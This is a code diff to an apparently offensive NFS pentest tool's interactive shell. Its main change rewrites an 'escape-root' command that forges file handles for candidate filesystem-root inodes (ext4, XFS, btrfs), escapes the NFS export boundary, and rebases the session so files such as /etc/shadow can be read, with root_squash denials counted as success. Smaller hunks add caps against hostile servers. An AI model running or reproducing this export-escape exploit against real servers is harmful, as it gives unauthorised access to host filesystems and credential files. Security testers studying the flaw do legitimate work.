@@ -33,6 +33,12 @@ const CAT_MAX_BYTES: u32 = 1_048_576; // 1 MiB
 /// Maximum bytes per NFS READ/WRITE chunk.
 const CHUNK_SIZE: u32 = 65_536; // 64 KiB
 
+/// Hard cap on accumulated directory entries in one listing. The NFS server is
+/// untrusted; a hostile server can return an ever-advancing cookie with
+/// `eof = false` forever, so paging must stop to avoid an infinite loop / OOM.
+/// Mirrors the FUSE side's `MAX_READDIR_ENTRIES`.
+const MAX_DIR_ENTRIES: usize = 1_000_000;
+
 /// All commands available in the interactive shell (for Tab completion of the first token).
 pub const SHELL_COMMANDS: &[&str] = &[
     "ls",
@@ -1278,31 +1284,57 @@ impl NfsShell {
     /// only validates the fsid in the handle, not that the inode falls within the export.
     /// By writing inode 2 (ext4/xfs) or subvol 256 (btrfs), we escape to the FS root.
     async fn cmd_escape_root(&mut self) {
-        match FileHandleAnalyzer::construct_escape_handle(&self.export_root) {
-            None => eprintln!("{}", "escape-root: unsupported filesystem type (ext4/xfs/btrfs only)".red()),
-            Some(result) => {
-                let escaped_fh = result.root_handle;
-                let args = GETATTR3args { object: escaped_fh.to_nfs_fh3() };
-                match self.nfs3.getattr(&args).await {
-                    Ok(Nfs3Result::Ok(ok)) => {
-                        let a = FileAttrs::from_fattr3(&ok.obj_attributes);
-                        eprintln!("{}", format!("[+] escaped to filesystem root ({:?})", result.fs_type).green().bold());
-                        eprintln!("{}", format!("    handle: {}", escaped_fh.to_hex()).cyan());
-                        eprintln!("{}", format!("    inode: {}  type: {:?}  mode: {:04o}", a.fileid, a.file_type, a.mode & 0o7777).cyan());
-                        // Also rebase the session's notion of "/" so absolute path
-                        // lookups (e.g. `cat /etc/shadow`, `last`, `cd /`) walk
-                        // from the underlying filesystem root rather than the
-                        // narrow export we MOUNTed through.
-                        self.export_root = escaped_fh.clone();
-                        self.cwd = escaped_fh;
-                        self.cwd_path = String::from("/ [escaped]");
-                        self.refresh_tab_cache().await;
-                    },
-                    Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("[!] escape handle returned {stat:?} -- try varying generation; use 'handle' to inspect current handle").yellow()),
-                    Err(e) => eprintln!("{}", format!("escape-root: {e}").red()),
-                }
-            },
+        // Try every plausible filesystem-root candidate for the detected FS type
+        // (ext4 inode 2, XFS 128/64/32, BTRFS subvols) rather than a single guess,
+        // so a UUID-based XFS export is not silently limited to the ext4 root.
+        let candidates = FileHandleAnalyzer::construct_root_candidates(&self.export_root);
+        if candidates.is_empty() {
+            eprintln!("{}", "escape-root: unsupported filesystem type (ext4/xfs/btrfs only)".red());
+            return;
         }
+
+        let mut last_stat: Option<nfsstat3> = None;
+        for result in candidates {
+            let escaped_fh = result.root_handle;
+            let args = GETATTR3args { object: escaped_fh.to_nfs_fh3() };
+            match self.nfs3.getattr(&args).await {
+                Ok(Nfs3Result::Ok(ok)) => {
+                    let a = FileAttrs::from_fattr3(&ok.obj_attributes);
+                    // Only a directory is the filesystem root; a non-directory hit
+                    // is a real but wrong inode inside the export -- keep trying.
+                    if a.file_type != FileType::Directory {
+                        continue;
+                    }
+                    eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {})", result.fs_type, result.inode_number).green().bold());
+                    eprintln!("{}", format!("    handle: {}", escaped_fh.to_hex()).cyan());
+                    eprintln!("{}", format!("    inode: {}  type: {:?}  mode: {:04o}", a.fileid, a.file_type, a.mode & 0o7777).cyan());
+                    // Rebase the session's notion of "/" so absolute lookups walk
+                    // the underlying filesystem root, not the narrow export.
+                    self.export_root = escaped_fh.clone();
+                    self.cwd = escaped_fh;
+                    self.cwd_path = String::from("/ [escaped]");
+                    self.refresh_tab_cache().await;
+                    return;
+                },
+                // Handle format accepted but root_squash blocks GETATTR -- the
+                // escape worked; rebase and let credential escalation read.
+                Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => {
+                    eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {}) -- root_squash active, GETATTR denied", result.fs_type, result.inode_number).green().bold());
+                    eprintln!("{}", format!("    handle: {}", escaped_fh.to_hex()).cyan());
+                    self.export_root = escaped_fh.clone();
+                    self.cwd = escaped_fh;
+                    self.cwd_path = String::from("/ [escaped]");
+                    self.refresh_tab_cache().await;
+                    return;
+                },
+                Ok(Nfs3Result::Err((stat, _))) => last_stat = Some(stat),
+                Err(e) => {
+                    eprintln!("{}", format!("escape-root: {e}").red());
+                    return;
+                },
+            }
+        }
+        eprintln!("{}", format!("[!] no escape candidate resolved to the filesystem root (last status: {last_stat:?}) -- try `nfswolf escape` for the full inode scan").yellow());
     }
 
     /// Switch the current directory to an arbitrary file handle (hex).
@@ -1512,8 +1544,13 @@ async fn try_readdirplus(nfs3: &Nfs3Client, dir_fh: &FileHandle) -> anyhow::Resu
             };
             out.push(DirEntryPlus { fileid: e.fileid, name, cookie: e.cookie, attrs, handle });
         }
-        // Stop at eof, on an empty page, or if the cookie fails to advance
-        // (defensive: a buggy server must not spin us forever).
+        // Stop at eof, on an empty page, at the entry cap (hostile-server guard),
+        // or if the cookie fails to advance (defensive: a buggy server must not
+        // spin us forever).
+        if out.len() >= MAX_DIR_ENTRIES {
+            tracing::warn!(entries = out.len(), "READDIRPLUS hit entry cap; listing truncated (possible hostile server)");
+            break;
+        }
         match last_cookie {
             Some(c) if !eof && c != cookie => cookie = c,
             _ => break,
@@ -1720,6 +1757,12 @@ async fn download_file(nfs3: &Nfs3Client, fh: &FileHandle, dest_path: &str, _tot
                 offset = offset.saturating_add(data.len() as u64);
                 if ok.eof || data.is_empty() {
                     break;
+                }
+                // The server is untrusted: cap the download so endless non-EOF
+                // chunks can't fill the local disk or hang the loop (mirrors
+                // read_all's READ_ALL_MAX_BYTES guard).
+                if offset > READ_ALL_MAX_BYTES {
+                    anyhow::bail!("download aborted at {offset} bytes: exceeds {READ_ALL_MAX_BYTES}-byte cap (untrusted server returning endless non-EOF data)");
                 }
             },
             Nfs3Result::Err((stat, _)) => anyhow::bail!("READ at offset {offset}: {stat:?}"),
